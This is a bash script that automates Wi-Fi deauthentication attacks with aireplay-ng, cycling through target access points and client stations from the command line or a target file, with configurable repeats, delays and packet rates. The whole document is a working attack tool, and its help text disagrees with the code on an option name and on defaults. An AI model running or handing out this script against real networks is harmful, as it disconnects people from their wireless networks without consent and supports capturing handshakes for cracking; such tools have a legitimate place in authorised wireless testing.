#!/bin/bash

show_help() {
    echo "Usage: $0 [-i INTERFACE] [-a AP_BSSID] [-c CHANNEL] [-s STA_BSSID] [-t AP_BSSID_FILE] [-w WAIT] [-r REPEATS] [-n COUNT] [-x SPEED] [-h]"
    echo
    echo "Options:"
    echo "  -i INTERFACE    Specify the interface name to use."
    echo "  -a AP_BSSID     Specify the target AP BSSID (mandatory for single target if not using -t)."
    echo "  -c CHANNEL      Specify the channel number (mandatory if not using -t)."
    echo "  -s STA_BSSID    Specify the target STA BSSID (mandatory for single target if not using -t)."
    echo "  -t FILE         Specify the path to the file containing target AP BSSIDs and channels (one per line, format: BSSID,STATION,CHAN)."
    echo "  -w WAIT         Specify the delay between runs in seconds (default: 60)."
    echo "  -r REPEATS      Specify how many times the cycle should repeat (default: 3)."
    echo "  -p COUNT        Specify the number of deauthentication packet groups to send per run (default: 1)."
    echo "  -x SPEED        Specify the packet speed (default: unlimited)."
    echo "  -h              Show this help menu."
    echo
    echo "Default Values:"
    echo "  WAIT           $DEFAULT_WAIT seconds"
    echo "  REPEATS        $DEFAULT_REPEATS times"
    echo "  COUNT          $DEFAULT_COUNT packets"
    echo "  SPEED          $DEFAULT_SPEED packets/second"
    echo
    echo "Target File Format for AP BSSID File:"
    echo
    echo "  BSSID,STATION,CHAN"
    echo "  DE:AD:BE:EF:12:34,AA:BB:CC:DD:EE:FF,6"
    echo
    echo "Examples:"
    echo
    echo "Single Target AP, Single Channel:"
    echo "  $0 -i wlan1mon -a 00:11:22:33:44:55 -c 6"
    echo
    echo "Single Target AP and Target STA, Single Channel:"
    echo "  $0 -i wlan1mon -a 00:11:22:33:44:55 -s aa:bb:cc:dd:ee:ff -c 6"
    echo
    echo "AP BSSID File, With Optional Defaults:"
    echo "  $0 -i wlan3mon -t targets.txt -w 30 -r 5"
    echo
}

cleanup() {
    echo "Cleaning up..."
    pkill -P $$  
    wait
    echo "Cleanup complete. Exiting script."
    exit 0
}

trap cleanup SIGINT

DEFAULT_WAIT=30
DEFAULT_REPEATS=1
DEFAULT_COUNT=1
DEFAULT_SPEED=1

while getopts ":i:a:c:s:t:w:r:p:x:h" opt; do
    case $opt in
        i) IFACE=$OPTARG ;;
        a) AP_BSSID=$OPTARG ;;
        c) CHANNEL=$OPTARG ;;
        s) STA_BSSID=$OPTARG ;;
        t) AP_BSSID_FILE=$OPTARG ;;
        w) WAIT_SECONDS=$OPTARG ;;
        r) REPEATS=$OPTARG ;;
        p) COUNT=$OPTARG ;;
        x) SPEED=$OPTARG ;;
        h) show_help
           exit 0 ;;
        \?) echo "Invalid option: -$OPTARG" >&2
            show_help
            exit 1 ;;
        :) echo "Option -$OPTARG requires an argument." >&2
           show_help
           exit 1 ;;
    esac
done

if [ -z "$IFACE" ]; then
    echo "[ERROR]: Interface is mandatory. Exiting." >&2
    show_help
    exit 1
fi

WAIT_SECONDS=${WAIT_SECONDS:-$DEFAULT_WAIT}
REPEATS=${REPEATS:-$DEFAULT_REPEATS}
COUNT=${COUNT:-$DEFAULT_COUNT}
SPEED=${SPEED:-$DEFAULT_SPEED}

# If not using a BSSID file, AP_BSSID is mandatory
if [ -z "$AP_BSSID_FILE" ]; then
    if [ -z "$AP_BSSID" ]; then
        echo "[ERROR]: AP_BSSID (-a) is mandatory if not using a BSSID file. Exiting." >&2
        show_help
        exit 1
    fi

    if [ -z "$STA_BSSID" ]; then
        echo "[WARNING]: No STA provided, removing -c flag from aireplay command."
        STA_BSSID=""
    fi
fi

if [ -n "$AP_BSSID" ]; then
    BSSIDS=("$AP_BSSID")
    STATION_BSSIDS=("$STA_BSSID")
    CHANNELS=("$CHANNEL")
elif [ -n "$AP_BSSID_FILE" ]; then
    BSSIDS=($(awk -F"," '{print $1}' "$AP_BSSID_FILE"))
    STATION_BSSIDS=($(awk -F"," '{print $2}' "$AP_BSSID_FILE"))
    CHANNELS=($(awk -F"," '{print $3}' "$AP_BSSID_FILE"))

    # Override channel if -c is used with -t
    if [ -n "$CHANNEL" ]; then
        echo "[WARNING]: Using -c option will override channel set in the file." >&2
        for ((i=0; i<${#CHANNELS[@]}; i++)); do
            CHANNELS[$i]="$CHANNEL"
        done
    fi
fi

first_run=true

if [ -z "$AP_BSSID_FILE" ]; then
    if [ -z "$CHANNEL" ]; then
        echo "[ERROR]: Channel is mandatory if not using a BSSID file. Exiting." >&2
        show_help
        exit 1
    fi

    for ((j=0; j<$REPEATS; j++)); do
        if [ "$first_run" = true ]; then
            # Initial message for the first run
            echo "Starting aireplay-ng in 10 seconds with the following options."
            echo "------------------------------"
            echo "Target AP: ${AP_BSSID}"
            echo "Target STA: ${STA_BSSID}"
            echo "Channel: ${CHANNEL}"
            echo "Interface: ${IFACE}"
            echo "Deauthentication count: $COUNT"
            echo "Packet speed: $SPEED packets/second"
            echo "Repeats: $((j+1))/${REPEATS}"
            echo "Wait time between attacks: ${WAIT_SECONDS}s"
            echo "------------------------------"
            echo
            sleep 10
            first_run=false
        fi

        echo "Starting Attack $((j+1)) of ${REPEATS}"
        echo "------------------------------"
        echo "Target AP: ${AP_BSSID}"
        echo "Target STA: ${STA_BSSID}"
        echo "Channel: ${CHANNEL}"
        echo "------------------------------"
        echo

        iwconfig "${IFACE}" channel "${CHANNEL}"
        
        if [ -n "${STA_BSSID[$i]}" ]; then
            aireplay-ng --deauth "$COUNT" -a "${BSSIDS[$i]}" -c "${STATION_BSSIDS[$i]}" -x "$SPEED" "${IFACE}"
        else
            aireplay-ng --deauth "$COUNT" -a "${BSSIDS[$i]}" -x "$SPEED" "${IFACE}"
        fi
        echo
        echo "Stopped aireplay-ng instance."
        
        if [ $j -lt $((REPEATS-1)) ]; then
            echo
            echo "Entering recurring delay of ${WAIT_SECONDS}s"
            sleep "${WAIT_SECONDS}"
        else
            echo "Completed All Repeats."
        fi
    done
fi

if [ -n "$AP_BSSID_FILE" ]; then
    for ((j=0; j<$REPEATS; j++)); do
        if [ "$first_run" = true ]; then
            # Initial message for the first run
            echo "Starting aireplay-ng in 10 seconds with the following options."
            echo "------------------------------"
            for i in "${!BSSIDS[@]}"; do
                echo "Target AP: ${BSSIDS[$i]}"
                echo "Target STA: ${STATION_BSSIDS[$i]}"
                echo "Channel: ${CHANNELS[$i]}"
                echo
            done
            echo "Interface: ${IFACE}"
            echo "Deauthentication count: $COUNT"
            echo "Packet speed: $SPEED packets/second"
            echo "Repeats: $((j+1))/${REPEATS}"
            echo "Wait time between attacks: ${WAIT_SECONDS}s"
            echo "------------------------------"
            echo
            sleep 10
            first_run=false
        fi

        for i in "${!BSSIDS[@]}"; do
            echo "Starting Attack $((j+1)) of ${REPEATS}"
            echo "------------------------------"
            echo "Target AP: ${BSSIDS[$i]}"
            echo "Target STA: ${STATION_BSSIDS[$i]}"
            echo "Channel: ${CHANNELS[$i]}"
            echo "------------------------------"
            echo

            # Set channel before running aireplay-ng command
            iwconfig "${IFACE}" channel "${CHANNELS[$i]}"
            
            aireplay-ng --deauth "$COUNT" -a "${BSSIDS[$i]}" -c "${STATION_BSSIDS[$i]}" -x "$SPEED" "${IFACE}"
            echo
            echo "Stopped aireplay-ng instance."
            
            if [ $j -lt $((REPEATS-1)) ]; then
                echo
                echo "Entering recurring delay of ${WAIT_SECONDS}s"
                sleep "${WAIT_SECONDS}"
            else
                echo "Completed All Repeats."
            fi
        done
    done
fi
